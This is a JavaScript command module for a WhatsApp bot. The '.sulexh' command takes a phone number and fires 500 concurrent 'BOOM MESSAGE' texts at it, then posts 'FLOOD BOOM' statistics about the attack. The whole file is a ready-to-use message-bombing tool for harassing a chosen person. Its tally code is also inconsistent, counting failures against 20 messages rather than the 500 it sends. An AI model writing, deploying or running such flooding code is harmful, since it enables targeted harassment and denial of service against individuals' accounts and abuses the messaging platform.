const { channelInfo } = require('../lib/messageConfig');  
  
async function sulexhCommand(sock, chatId, message) {  
    try {

        // get command text
        const text = message.message?.conversation || message.message?.extendedTextMessage?.text || "";
        const args = text.split(" ");

        // check number
        if (!args[1]) {
            return sock.sendMessage(chatId, {
                text: "❌ Example: .sulexh 2547XXXXXXXX"
            }, { quoted: message });
        }

        // convert number to whatsapp jid
        const target = args[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        // Create array of message promises for massive BOOM effect
        const boomMessages = [];  
          
        // Prepare 500 messages for instant concurrent delivery
        for (let i = 0; i < 500; i++) {  

            const boomPromise = sock.sendMessage(target, {   
                text: `💥 BOOM MESSAGE #${i + 1}`   
            }).catch((error) => {  
                console.log(`BOOM message ${i + 1} failed:`, error.message || error);  
                return { failed: true, index: i + 1 };  
            });  
              
            boomMessages.push(boomPromise);  
        }  
  
        console.log("🚀 Launching 500 concurrent messages...");  
        const launchStartTime = Date.now();  
          
        const boomResults = await Promise.allSettled(boomMessages);  
          
        const launchEndTime = Date.now();  
        const totalLaunchTime = launchEndTime - launchStartTime;  
  
        const successfulHits = boomResults.filter(result =>   
            result.status === 'fulfilled' &&   
            result.value &&   
            !result.value.failed  
        ).length;  
          
        const failedHits = 20 - successfulHits;  
  
        await sock.sendMessage(chatId, {  
            text: `💥💥💥 FLOOD BOOM COMPLETE! 💥💥💥\n` +  
                  `📊 Statistics:\n` +  
                  `🎯 Target: ${args[1]}\n` +
                  `✅ Successful: ${successfulHits}/500\n` +  
                  `❌ Failed: ${failedHits}/500\n` +  
                  `⏱️ Total Time: ${totalLaunchTime}ms\n` +  
                  `🚀 Concurrent Execution: TRUE\n` +  
                  `💣 BOOM Mode: ACTIVATED`,  
            ...channelInfo  
        }, { quoted: message });  
  
        console.log(`BOOM execution completed: ${successfulHits}/20 messages sent in ${totalLaunchTime}ms`);  
  
    } catch (error) {  
        console.error("Critical BOOM command error:", error);  
  
        await sock.sendMessage(chatId, {  
            text: "❌💥 BOOM SYSTEM FAILURE\n" +  
                  `Error: ${error.message || 'Unknown error occurred'}`,  
            ...channelInfo  
        }, { quoted: message });  
    }  
}  
  
module.exports = sulexhCommand;
